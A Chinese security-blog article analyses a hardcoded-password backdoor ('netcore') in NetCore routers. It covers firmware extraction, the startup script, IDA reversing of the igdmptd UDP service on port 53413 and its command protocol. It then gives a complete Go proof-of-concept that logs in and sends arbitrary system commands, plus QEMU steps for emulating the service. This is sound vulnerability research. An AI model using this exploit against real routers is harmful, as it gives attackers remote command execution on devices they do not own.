# NetCore(磊科)全系列路由器后门漏洞分析

阅读量 **307900**

|评论 **5**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-07-13 16:30:48

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 1\. 漏洞介绍

Netcore系列路由器中有个硬编码的密码，攻击者可以轻而易举地利用这个口令登录路由器，而且用户无法更改和禁用这个后门。攻击者可以利用该程序执行任意系统命令、上传/下载文件、控制路由器。

## 2\. 漏洞分析

NetCoreT1腾讯安全无线路由器，固件版本为 **V1.0.140120**

下载地址 <http://www.uzzf.com/qudong/70779.html>

###  2.1 固件分析

解压固件

    
    
    $ binwalk T1.bin
    

![](https://p2.ssl.qhimg.com/t01d545aabc3a13396e.png)

###  2.2 查看监听53413端口程序

查看系统开机自启动脚本

    
    
    $ ls etc
    

![](https://p3.ssl.qhimg.com/t01a26632a92f1e8deb.png)

定位到开机启动脚本rcS

    
    
    ........
    #insmod /lib/modules/main.ko
    #setvlan 31 0 0 0 0
    ifconfig pppoe up
    ifconfig vir1 hw ether 00:00:00:00:51:88
    ifconfig vir1 up
    ifconfig lo 127.0.0.1
    #add by zhouqingwei
    checknvram
    cfe_update -d
    /bin/switch -d
    sleep 5
    mkdir /tmp/usb
    #echo fuck
    #/bin/cmac -d
    /bin/igdmptd -d
    
    #echo fuck1
    

定位到igdmptd程序

###  2.3 漏洞成因分析

####  2.3.1 程序初始化

使用IDA打开IGDMPTD

在0x0040234C处的create_server函数中创建Socket会话。

    
    
    #include <sys/socket.h>
    
    int socket(int af,int type,int protocol)
    // af 一个地址描述符。
    // type 指定socket类型。新套接字接口的类型描述类型，如TCP和UDP
    // protocol 顾名思义，就是指定协议
    

**查看是否是UDP通信**

![](https://p2.ssl.qhimg.com/t01bacc6909c9a5232d.png)

protocol 值为0x11 -> IPPROTO_UDP socket为UDP连接

type 值为1 -> SOCK_STREAM

af 值为2 -> AF_INET

####  2.3.2 后门函数处理

完成绑定后，程序会在0x00401E5C处调用operate_loop函数。该函数用来完成整个后门命令数据的接收、执行传动及执行结果的回传。

程序反编译

![](https://p2.ssl.qhimg.com/t01dbfc3010de9eb5e8.png)

**1\. 登录检查**

v2 = 0 进入登陆检查流程

![](https://p1.ssl.qhimg.com/t01baaa5b4a543c6583.png)

do_mptlogin函数->call_mptlogin函数

![](https://p0.ssl.qhimg.com/t01eb246459f015a874.png)

判断密码是否与硬编码的密码”netcore”一致，如果一致表示认证成功,否则失败

认证成功之后，可以跳转到功能模块

**2\. 功能模块**

**2.1 功能模块流程伪代码**

核心处理伪代码

    
    
    v11 = (BYTE2(command[0]) << 8) | HIBYTE(HIWORD(command[0])); //功能选项
    if(v11){
        if(v11 == 1){
            do_getfile()
        }else if( v11 = 2){
            do_putfile()
        }
    }
    else if(v3 = 8){
        //返回发送数据
    }else if(!strcmp(cmd,"?")){
        //返回版本信息
    }else if(command[2]) == '$'{
        do_mptfun()
    }else{
        do_system()
    }
    

**2.2 主要功能模块**

**do_system模块**

![](https://p5.ssl.qhimg.com/t01d4398e8f220da2e3.png)

**do_putfile模块**

![](https://p1.ssl.qhimg.com/t01c33136a9507a7ef2.png)

….

**2.3 通信协议**

**登录认证**

占位 | 命令选项 | 占位 | 命令内容  
---|---|---|---  
2字节 | \x00\x00 | 2字节 | netcore  
  
**命令执行**

占位 | 命令选项 | 占位 | 命令内容  
---|---|---|---  
2字节 | \x00\x00 | 2字节 | cmd  
  
经过POC程序调试发现，命令结果发送完毕后，IGDMPTD会发送一个消息

![](https://p0.ssl.qhimg.com/t01dd2bf33d1411821c.png)

**执行结果发送完毕**

占位 | 命令选项 | 占位 | 命令内容  
---|---|---|---  
2字节 | \x00\x05 | 2字节 | 100 0 0 0 127  
  
## 3\. 漏洞利用

###  3.1 POC代码

Golang编写POC代码

    
    
    package main
    
    import (
        "fmt"
        "net"
        "strings"
    )
    
    var command string
    
    const (
        BUFSIZE = 0x4000
    )
    
    func login() bool {
        fd, err := net.Dial("udp", "192.168.72.129:53413")
        if err != nil {
            fmt.Println(err.Error())
            return false
        }
        data := []byte("pa" + "\x00\x00" + "word" + "netcore")
        fd.Write(data)
    
        recvData := make([]byte, BUFSIZE)
        number, err := fd.Read(recvData)
        if err != nil {
            fmt.Println(err.Error())
            return false
        }
    
        fmt.Println("Receive Result Length:", number)
        resp := string(recvData[:number])
        fmt.Println("Receive Result Data:", resp) //将数据二进制数据流打印
        if strings.Contains("success", resp) {
            fmt.Println("[*] Status: Valid current password,We logged in!")
        } else if len(resp) >= 12 {
            fmt.Println("[*] Status: you are currently logged in!")
        }
    
        return true
    }
    
    func system(cmd string) bool {
        HEAD := []byte("pa" + "\x00\x00" + "word" + cmd )
    
        fd, err := net.Dial("udp", "192.168.72.129:53413")
        if err != nil {
            fmt.Println(err.Error())
            return false
        }
    
        defer fd.Close()
    
        fd.Write(HEAD)
        result := make([]byte, BUFSIZE)
    
        for {
            number, err := fd.Read(result)
            if err != nil {
                return false
            }
    
            fmt.Println(result[:number])
            resp := string(result[:number])
            fmt.Println(resp)
            if number == 0 {
                break
            }
    
            if len(resp) > 12{
                fmt.Println(resp)
            }
    
            endflag := []byte("\x00\x00\x00\x00")
            if strings.Contains("\x00\x00\x00\x00", string(endflag)) {
                break
            }
        }
    
        return true
    }
    
    func execCommand() {
        for {
            fmt.Print(">:")
            fmt.Scanln(&command)
            system(command)
        }
    }
    func main() {
        login()
        execCommand()
    }
    

**编译程序**

    
    
    $ go build -o poc.exe
    

###  3.2 模拟运行程序

    
    
    $ sudo cp $(which qemu-mipsel-static) ./
    $ sudo chroot . ./qemu-mipsel-static /bin/igdmptd
    

![](https://p4.ssl.qhimg.com/t0165f4f7ce3b8c5578.png)

## 4\. 漏洞测试

**1\. 运行POC程序**  
 **2\. 执行任意命令**

![](https://p4.ssl.qhimg.com/t014a8c5b351ccc98d0.png)

## 总结

后门漏洞作为一种威胁性极高的漏洞，它的危害不亚于二进制漏洞。可以想象即使拥有完美的安全防护，可是却留下一条不为人知的秘密通道，如果被攻击者发现，攻击者便可以轻松进入并获取权限。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Crazy_Box** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/246510](/post/id/246510)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [物联网](/tag/物联网)
  * [路由器](/tag/路由器)

 **+1** __4赞

 __收藏

![](https://p4.ssl.qhimg.com/t0112da1ba599270104.png) Crazy_Box

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

